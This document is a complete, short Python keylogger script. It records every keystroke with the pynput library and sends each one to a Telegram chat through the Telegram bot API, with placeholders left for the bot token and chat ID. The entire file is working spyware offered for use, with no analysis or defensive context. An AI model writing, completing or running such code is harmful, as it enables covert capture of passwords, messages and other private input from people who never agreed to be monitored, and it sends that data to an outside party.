#!/usr/bin/env python
from pynput import keyboard
import requests

BOT_TOKEN = "PUT-YOUR-TELEGRAM-BOT-TOKEN-HERE"
CHAT_ID = "PUT-YOUR-CHAT-ID-HERE"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

def send(msg):
    requests.get(API_URL, params={"chat_id": CHAT_ID, "text": msg})

def on_press(key):
    try:
        send(str(key.char))
    except AttributeError:
        send(str(key))

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
